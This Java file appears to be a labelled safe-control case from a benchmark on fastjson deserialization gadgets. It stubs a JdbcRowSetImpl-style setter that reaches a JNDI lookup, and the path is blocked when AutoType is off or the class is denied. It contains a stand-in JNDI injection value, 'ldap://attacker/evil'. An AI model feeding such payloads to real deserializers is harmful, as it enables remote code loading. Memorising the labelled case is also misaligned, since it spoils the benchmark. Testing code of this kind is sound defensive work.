package com.jsef.benchmark.sec.gadgetmine;

/**
 * JSEF-Benchmark L4 — fastjson gadget 挖掘安全对照 (9)(10)：变体均不可达
 * ============================================================================================
 * 安全对照（对应 JSEF-GM-008）：同一 VariantKickStub 占位类，但**未满足充要可达条件**，
 * 因此两条 kick 变体（setDataSourceName / setAutoCommit）都不可达 JNDI lookup sink。
 *
 * 阻断条件（满足任一即安全）：
 *   A) AutoType 关闭 → 无法按 @type 实例化 VariantKickStub，变体入口不存在；
 *   B) deny 复活被拒 → 目标类被列入黑名单/拒绝列表，反序列化阶段即被拒绝。
 *
 * 教学占位说明：
 *   - 不 import com.alibaba.fastjson / javax.naming；
 *   - VariantKickStub 与 vuln 侧语义一致，但 SAFE 侧**按实现判定**：
 *     在 autoType 关闭或被 deny 时，setter 不被调用、lookup 不触发。
 *
 * 安全底线：仅 localhost 演示语义。不引入真实 fastjson，不提供真实 JNDI 利用链。
 * SAFE 侧按真实实现判定（变体入口被阻断）。
 *
 * 预期：SAFE（expect=SAFE），level=L4。
 */
public class GmVariantKickSafe {

    /**
     * 教学占位类：语义等价 JdbcRowSetImpl 风格（JNDI lookup 触发点）。
     */
    public static class VariantKickStub {

        private String dataSourceName;

        public void setDataSourceName(String name) {
            this.dataSourceName = name;
            // 安全态下不会被调用（见 safeDemo 拦截）
            jndiLookup(name);
        }

        public void setAutoCommit(boolean autoCommit) {
            connect();
        }

        private void connect() {
            jndiLookup(this.dataSourceName);
        }

        private void jndiLookup(String name) {
            System.out.println("[demo-only] InitialContext.lookup reached with name: " + name);
        }
    }

    /**
     * 安全演示入口：autoType 关闭 或 deny 复活被拒 → 变体均不可达。
     */
    // [CHECKPOINT id=JSEF-GM-008S cwe=502 level=L4 source=@type/setDataSourceName|setAutoCommit sink=InitialContext.lookup (autoType off / deny) expect=SAFE]
    public static void safeDemo(boolean autoTypeSupport, boolean denied) {
        // 安全处理：autoType 关闭 或 deny 复活被拒 → 不实例化、不调用 kick setter
        if (!autoTypeSupport || denied) {
            System.out.println("[demo-only] variant kick blocked: autoType off or denied");
            return;
        }
        VariantKickStub stub = new VariantKickStub();
        stub.setDataSourceName("ldap://attacker/evil");
        stub.setAutoCommit(true);
    }
}
